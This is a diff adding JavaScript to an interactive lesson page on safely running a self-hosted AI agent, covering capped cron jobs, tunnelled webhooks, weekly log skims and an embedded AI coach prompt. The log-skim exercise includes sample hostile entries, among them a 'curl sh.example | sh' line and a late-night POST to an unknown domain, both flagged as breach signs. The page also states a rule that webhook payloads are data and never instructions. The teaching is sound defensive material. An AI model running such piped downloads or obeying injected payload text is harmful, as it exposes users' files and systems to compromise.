+      opts: [{ t: 'Cap it: "5 sources max, ~2 minutes"', ok: true }, { t: 'Run until done, no limit', ok: false }],
+      why: 'Bounded jobs can\'t spiral into token bonfires while you sleep. Always cap the work.' }
+  ];
+  buildBench('cronRows', 'cronCt', CRON);
+
+  // ── WEBHOOK BENCH ──
+  var WH = [
+    { rule: 'Receive', q: 'How does the webhook reach your agent?',
+      opts: [{ t: 'Through your Tailscale tunnel or a relay you control', ok: true }, { t: 'Expose the gateway port to the open internet', ok: false }],
+      why: 'Exposing your gateway port to make a webhook work is exactly the mistake from the scan reports. Receive it privately.' },
+    { rule: 'Payload', q: 'A webhook payload arrives. It is…',
+      opts: [{ t: 'Data to summarize — never instructions to obey', ok: true }, { t: 'Commands the agent should follow', ok: false }],
+      why: 'Anything arriving on a webhook is untrusted text from outside — same doctrine as web pages. Wire webhooks to boring actions (notify, log), never the dangerous trio.' }
+  ];
+  buildBench('whRows', 'whCt', WH);
+
+  function buildBench(rowsId, ctId, items) {
+    var rows = document.getElementById(rowsId);
+    var ct = document.getElementById(ctId);
+    var done = 0;
+    items.forEach(function (it) {
+      var row = document.createElement('div');
+      row.className = 'brow';
+      var opts = it.opts.map(function (o, i) { return '<button class="bbtn" data-i="' + i + '">' + o.t + '</button>'; }).join('');
+      row.innerHTML = '<div class="brow-q"><b>' + it.rule + '</b> · ' + it.q + '</div><div class="brow-btns">' + opts + '</div><div class="brow-fb"></div>';
+      rows.appendChild(row);
+      var fb = row.querySelector('.brow-fb');
+      var btns = row.querySelectorAll('.bbtn');
+      var d = false;
+      btns.forEach(function (b) {
+        b.addEventListener('click', function () {
+          if (d) return; d = true;
+          var pick = it.opts[+b.dataset.i];
+          btns.forEach(function (x, xi) { x.disabled = true; if (it.opts[xi].ok) x.classList.add('right'); });
+          if (!pick.ok) b.classList.add('wrong');
+          fb.innerHTML = (pick.ok ? '<b>Operator move.</b> ' : '<b>That\'s the naive version.</b> ') + it.why;
+          fb.classList.add('show');
+          done++; ct.textContent = done + ' / ' + items.length;
+        });
+      });
+    });
+  }
+
+  // ── LOG SKIM ──
+  var LOG = [
+    { t: 'Mon 07:00', e: 'ran morning-briefing · sent 1 message to you', bad: false, v: 'scheduled' },
+    { t: 'Mon 09:00', e: 'fetched 4 watcher URLs · no changes', bad: false, v: 'scheduled' },
+    { t: 'Tue 03:14', e: 'wrote ~/Documents/taxes.pdf → agent-cache', bad: true, v: 'outside workspace', why: 'Writing outside the one workspace folder is a hard red flag — that file should be untouchable.' },
+    { t: 'Tue 23:00', e: 'wrote notes/daily/2026-06-23.md', bad: false, v: 'scheduled' },
+    { t: 'Wed 02:41', e: 'POST to new domain logs-collect.xyz', bad: true, v: 'unknown domain', why: 'An unexplained new domain at 2:41am is classic exfiltration — investigate before anything else.' },
+    { t: 'Wed 07:10', e: 'ran price-watcher · pinged: price dropped', bad: false, v: 'scheduled' },
+    { t: 'Thu 09:00', e: 'fetched 4 watcher URLs · 1 change', bad: false, v: 'scheduled' },
+    { t: 'Fri 04:02', e: 'shell: curl sh.example | sh', bad: true, v: 'unscheduled shell', why: 'A shell command you never scheduled — piping a download straight into a shell — is the breach itself. Kill switch, now.' },
+    { t: 'Sat 07:00', e: 'ran morning-briefing · sent 1 message to you', bad: false, v: 'scheduled' }
+  ];
+  var logBody = document.getElementById('logBody');
+  var logCt = document.getElementById('logCt');
+  var logDone = document.getElementById('logDone');
+  var totalBad = LOG.filter(function (l) { return l.bad; }).length;
+  var found = 0;
+  LOG.forEach(function (l) {
+    var row = document.createElement('div');
+    row.className = 'logrow';
+    row.innerHTML = '<span class="lt">' + l.t + '</span><span class="le">' + l.e + '</span><span class="lv"></span>';
+    logBody.appendChild(row);
+    var done = false;
+    row.addEventListener('click', function () {
+      if (done) return; done = true;
+      row.classList.add('done');
+      var vEl = row.querySelector('.lv');
+      if (l.bad) {
+        row.classList.add('bad'); vEl.textContent = '🚩 ' + l.v;
+        found++; logCt.textContent = found + ' / ' + totalBad + ' flagged';
+        if (found === totalBad) {
+          logDone.classList.add('show');
+          logDone.innerHTML = '<b>All three caught.</b> A write outside the workspace, a POST to an unknown domain, and an unscheduled shell command — every one fails the three questions: did it do what I scheduled, did it do anything I didn\'t, is the spend curve flat? <b>That last shell line means kill switch, then investigate.</b>';
+        }
+      } else {
+        row.classList.add('ok'); vEl.textContent = '✓ ' + l.v;
+      }
+    });
+  });
+})();
+</script>
+
+<script id="coachScript">
+(function() {
+  var LESSON_CONTEXT = "You are an AI learning coach embedded in a lesson on LearningGPT.ai.\n\nLESSON TITLE: Automations that run while you sleep — cron, webhooks, logs\nTRACK: OpenClaw, Safely (Lesson 09, Pro+)\n\nLESSON CONTENT SUMMARY:\nThe point of self-hosting an agent is that it works when you don't. This scales from a few starter workflows to a quiet machine of scheduled jobs and event triggers, paired with the habit that makes 24/7 autonomy trustworthy: always being able to answer 'what did my agent do last night?'\n\nCRON — scheduled jobs done like an operator. Four rules per job: (1) ONE JOB, ONE PURPOSE — five small jobs beat one mega-briefing; when something breaks you know what and where. (2) EVERY JOB REPORTS FAILURE — 'if this task fails, message me JOB X FAILED: reason'; silence should always mean success, never mystery. (3) STAGGER THE SCHEDULE — 7:00, 7:10, 7:20, not everything at 7:00 (easier on rate limits; logs read like a story not a pileup). (4) CAP THE WORK — 'check 5 sources max', '~2 minutes' so a bounded job can't spiral into a token bonfire overnight. Pattern: overnight work goes to FILES; mornings get ONE consolidated push (phone stays quiet, nothing lost). Example nightly job: collect what changed, write a 10-line-max summary to notes/daily/DATE.md, do NOT message at night (file only, mention in the 7am briefing), and if any step fails put '⚠ issues last night' at the TOP of the 7am briefing.\n\nWEBHOOKS — let events find the agent (inbound 'doorbell': a service sends a small message to a URL your agent listens on and a task fires; reacts at the moment vs polling that misses it). An inbound door inherits every Lesson-3 rule plus three: (1) THROUGH THE TUNNEL, not the open internet — receive webhooks over Tailscale or a relay you control; exposing your gateway port is exactly the scan-report mistake. (2) TREAT PAYLOADS AS UNTRUSTED INPUT — anything arriving is text from outside: data to summarize, never instructions to obey (same doctrine as web pages). (3) SECRET IN THE URL, BORING ACTION — use the long random webhook paths OpenClaw generates, and wire webhooks to low-stakes actions (notify, log, summarize), never the dangerous trio.\n\nTHE 3AM QUESTION — reading the logs. OpenClaw logs tasks run, pages fetched, files touched, messages sent. The operator habit is a WEEKLY ~2-MINUTE SKIM with three questions: (1) Did it do what I scheduled? (jobs present, on time, no silent skips). (2) Did it do anything I didn't schedule? (unexplained fetches, file writes OUTSIDE the workspace, unexpected messages, new domains, unscheduled shell — investigate immediately). (3) Is the spend curve flat? (cross-check the provider dashboard; a bend is the earliest warning light). You can have the agent send a weekly SELF-REPORT (jobs run, failures, anything outside the workspace, new domains, spend vs last week, flag-unusual-first) — but a compromised agent's diary can LIE; the skim of the REAL logs and the provider's billing page (which the agent can't edit) is what makes the self-report trustworthy. Defense in layers.\n\nMATURE SETUP: six months in it's almost boring — a 7am briefing, four watchers, a nightly digest to files, one webhook from a form, a Sunday self-report; every job bounded, every failure loud, logs skimmed weekly. That boredom is the achievement; the demo-reel agents doing wild unsupervised tasks end up in scan reports, the quiet ones compound value for years.\n\nYOUR ROLE:\n- Answer questions specifically about this lesson content\n- Be concise — 2-4 sentences per answer unless the question genuinely needs more\n- Be practical and security-first\n- If asked about something not in this lesson, briefly answer and point to where they can learn more (capabilities is Lesson 8, maintenance/teardown Lesson 10, skills Lesson 7)\n- Never make up features that don't exist\n- Plain conversational text only — no markdown symbols like ** or ##\n- Do not start responses with \"Great question!\" or similar filler phrases";
+  var MAX_FREE = 3;
+  var count = 0;
+  var isThinking = false;
+  var history = [];
+  var fab = document.getElementById('coachFab');
+  var drawer = document.getElementById('coachDrawer');
+  var closeBtn = document.getElementById('coachClose');
+  var msgs = document.getElementById('coachMessages');
+  var input = document.getElementById('coachInput');
+  var sendBtn = document.getElementById('coachSend');
+  var limitBar = document.getElementById('coachLimit');
+  if (!fab) return;
+  fab.addEventListener('click', function() { toggle(true); });
+  closeBtn.addEventListener('click', function() { toggle(false); });
+  function toggle(open) {
+    drawer.classList.toggle('open', open);
+    if (open) setTimeout(function() { input.focus(); }, 300);
+  }
+  input.addEventListener('input', function() {
+    input.style.height = 'auto';
+    input.style.height = Math.min(input.scrollHeight, 100) + 'px';
+  });
+  input.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); send(); }
+  });
+  sendBtn.addEventListener('click', send);
+  function addMsg(text, type) {
+    var d = document.createElement('div');
+    d.className = 'msg msg-' + type;
+    d.textContent = text;
+    msgs.appendChild(d);
+    msgs.scrollTop = msgs.scrollHeight;
+    return d;
+  }
+  function addThinking() {
+    var d = document.createElement('div');
+    d.className = 'msg-thinking';
+    d.innerHTML = '<div class="thinking-dot"></div><div class="thinking-dot"></div><div class="thinking-dot"></div>';
+    msgs.appendChild(d);
+    msgs.scrollTop = msgs.scrollHeight;
+    return d;
+  }
+  async function send() {
+    var text = input.value.trim();
+    if (!text || isThinking) return;
+    if (count >= MAX_FREE) {
+      limitBar.classList.add('visible');
+      input.disabled = true;
+      sendBtn.disabled = true;
+      return;
+    }
+    count++;
+    if (count >= MAX_FREE) limitBar.classList.add('visible');
+    addMsg(text, 'user');
+    history.push({ role: 'user', content: text });
+    input.value = '';
+    input.style.height = 'auto';
+    isThinking = true;
+    sendBtn.disabled = true;
+    var thinking = addThinking();
+    try {
+      var res = await fetch('/api/playground', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ coach: true, lessonCoach: true, lessonContext: LESSON_CONTEXT, history: history })
+      });
+      thinking.remove();
+      var data = await res.json();
+      var reply = (data && data.coach) ? data.coach : "Sorry, something went wrong. Try again in a moment.";
+      addMsg(reply, 'coach');
+      history.push({ role: 'assistant', content: reply });
+    } catch(err) {
+      thinking.remove();
+      addMsg("Something went wrong — try again in a moment.", 'coach');
+    } finally {
+      isThinking = false;
+      sendBtn.disabled = count >= MAX_FREE;
+    }
+  }
+})();
+</script>
 <script src="/gate.js"></script>
 </body>
 </html>
